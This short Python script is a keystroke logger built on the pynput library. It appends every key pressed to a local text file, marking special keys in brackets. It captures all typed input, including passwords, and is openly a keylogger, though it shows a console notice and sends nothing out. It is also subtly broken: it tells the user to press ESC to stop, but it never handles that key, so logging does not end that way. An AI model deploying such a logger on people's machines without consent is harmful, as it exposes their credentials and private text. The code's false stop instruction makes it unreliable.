from pynput import keyboard

log_file = "user_input_log.txt"  # File to save logs

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):  # If it's a normal key
                f.write(key.char)
            else:  # If it's a special key (Enter, Space, etc.)
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

def start_logger():
    print("Logging started... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

start_logger()